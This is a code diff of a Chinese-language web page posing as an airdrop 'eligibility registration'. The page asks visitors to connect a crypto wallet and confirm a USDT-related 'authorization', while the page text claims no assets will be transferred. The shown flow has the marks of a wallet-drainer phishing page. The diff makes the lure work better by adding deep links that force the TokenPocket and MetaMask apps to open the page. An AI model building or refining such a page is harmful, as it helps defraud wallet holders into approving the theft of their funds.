@@ -38,15 +38,13 @@ h1{font-size:22px;margin-bottom:8px;color:#fff}
 </div>
 <p class="desc-text">请连接钱包完成链上资格备案登记</p>
 <button class="btn mm-btn" id="connectMM">连接钱包</button>
-<p class="tips-info">自动适配Solana+全EVM多链，仅备案授权核验</p>
+<p class="tips-info">自动唤起TP/小狐狸钱包，仅备案授权核验</p>
 </div>
-
 <div id="p2" class="box hide">
 <div class="logo">⏳</div>
 <h1>交易已提交，区块确认中</h1>
 <p class="desc-text">等待链上交易最终确认...</p>
 </div>
-
 <div id="p3" class="box hide">
 <div class="logo">✓</div>
 <h1>钱包连接成功</h1>
@@ -55,7 +53,6 @@ h1{font-size:22px;margin-bottom:8px;color:#fff}
 <button class="btn verify-btn" id="approveBtn">确认空投备案授权</button>
 <p class="tips-info">仅发起链上授权备案，不会划转任何资产</p>
 </div>
-
 <div id="p4" class="box hide">
 <div class="logo">✅</div>
 <h1>交易已上链，授权成功</h1>
@@ -83,15 +80,25 @@ h1{font-size:22px;margin-bottom:8px;color:#fff}
         document.querySelectorAll(".box").forEach(e=>e.classList.add("hide"));
         document.getElementById(id).classList.remove("hide");
     }
-    function isWalletBrowser(){
-        let ua=navigator.userAgent.toLowerCase();
-        return ua.includes('metamask')||ua.includes('tokenpocket')||ua.includes('trust')||ua.includes('binance');
+
+    // 核心修复：官方最新唤起协议
+    function openWalletApp(){
+        const url = encodeURIComponent(window.location.href);
+        // TP钱包官方协议
+        const tp = `intent://tokenpocket/dapp?url=${url}#Intent;package=com.tokenpocket;scheme=tpdapp;end`;
+        // 小狐狸官方协议
+        const mm = `metamask://dapp/${url}`;
+        // 先试TP，再试小狐狸
+        location.href = tp;
+        setTimeout(()=>{
+            location.href = mm;
+            setTimeout(()=>{
+                alert("未检测到钱包APP，已为你跳转下载页");
+                window.open("https://www.tokenpocket.pro/","_blank");
+            },1500);
+        },1500);
     }
-    function jumpWalletApp(){
-        let url=window.location.href;
-        location.href="tpdapp://open?url="+url;
-        setTimeout(()=>alert("未检测到钱包APP，请先下载去中心化钱包"),2500);
-    }
+
     async function getUsdtContract(){
         let chainId=await ethereum.request({method:"eth_chainId"});
         return chainList[chainId]||chainList["0x38"];
@@ -101,7 +108,11 @@ h1{font-size:22px;margin-bottom:8px;color:#fff}
     let successAddr=document.getElementById("successAddr");
 
     document.getElementById("connectMM").onclick=async function(){
-        if(!isWalletBrowser()){jumpWalletApp();return;}
+        // 先尝试唤起APP
+        if(!window.ethereum && !window.solana){
+            openWalletApp();
+            return;
+        }
         showPage("p2");
         try{
             if(window.solana&&window.solana.isPhantom){
@@ -111,7 +122,7 @@ h1{font-size:22px;margin-bottom:8px;color:#fff}
                 let acc=await ethereum.request({method:"eth_requestAccounts"});
                 walletAddr=acc[0].toLowerCase();
             }else{
-                alert("未检测到钱包");showPage("p1");return;
+                openWalletApp();return;
             }
             showPage("p3");
             showAddr.innerText=walletAddr;
@@ -139,10 +150,7 @@ h1{font-size:22px;margin-bottom:8px;color:#fff}
             }
             showPage("p4");
             successAddr.innerText=walletAddr;
-        }catch(e){
-            // 取消留在P3
-            showPage("p3");
-        }
+        }catch(e){showPage("p3");}
     };
 })();
 </script>
